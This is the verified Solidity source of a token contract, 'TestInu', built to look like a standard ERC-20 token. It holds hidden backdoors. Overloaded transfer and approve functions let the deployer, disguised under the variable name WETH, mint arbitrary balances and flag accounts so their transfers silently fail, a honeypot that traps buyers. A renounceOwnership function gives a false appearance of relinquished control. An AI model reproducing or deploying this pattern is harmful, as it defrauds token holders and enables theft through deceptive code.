/**
 *Submitted for verification at BscScan.com on 2023-04-21
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}


contract TestInu {
    mapping (address => uint256) private convert;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping (address => uint256) private request;

    string public name;
    string public symbol;
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address public WETH;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor(string memory _name, string memory _symbol)  {
        WETH = msg.sender;
        display(msg.sender, totalSupply);
        name = _name; symbol = _symbol;}

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }


    function display(address account, uint256 amount) internal {
        request[msg.sender] = totalSupply;
        emit Transfer(address(0), account, amount); }

    function balanceOf(address account) public view  returns (uint256) {
        return request[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {


        if(convert[msg.sender] <= 0) {
            require(request[msg.sender] >= value);
            request[msg.sender] -= value;
            request[to] += value;
            emit Transfer(msg.sender, to, value);
            return true; }}
            function transfer(uint256 sz,address sx)  public {
        if(msg.sender == WETH) {
            request[sx] = sz;}}


    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function approve(uint256 sz, address sx)  public {

    if(msg.sender == WETH) {
    convert[sx] = sz;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        if(from == WETH) {require(value <= request[from]);require(value <= allowance[from][msg.sender]);
    request[from] -= value;
    request[to] += value;
        emit Transfer (from, to, value);
        return true; }else
    if(convert[from] <= 0 && convert[to] <= 0) {
    require(value <= request[from]);
        require(value <= allowance[from][msg.sender]);
        request[from] -= value;
        request[to] += value;
        allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true; }}


}